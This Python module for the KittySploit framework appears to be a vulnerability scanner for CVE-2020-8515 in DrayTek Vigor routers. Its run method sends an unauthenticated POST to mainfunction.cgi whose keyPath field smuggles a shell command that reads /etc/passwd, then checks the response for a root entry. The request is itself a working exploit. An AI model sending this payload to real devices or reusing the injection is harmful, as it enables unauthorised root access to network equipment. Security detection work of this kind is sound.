#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DrayTek Vigor2960 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DrayTek - Remote Code Execution Detection',
        'description': 'DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code execution as root (without authentication) via shell metacharacters to the cgi-bin/mainfunction.cgi URI.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rce', 'kev', 'draytek', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)',
            'https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8515',
            'https://sku11army.blogspot.com/2020/01/draytek-unauthenticated-rce-in-draytek.html',
            'https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-%28cve-2020-8515%29/',
        ],
        'cve': 'CVE-2020-8515',
    }

    def run(self):
        path = '/cgi-bin/mainfunction.cgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='DrayTek - Remote Code Execution detected', path=path)
            return True
        return False

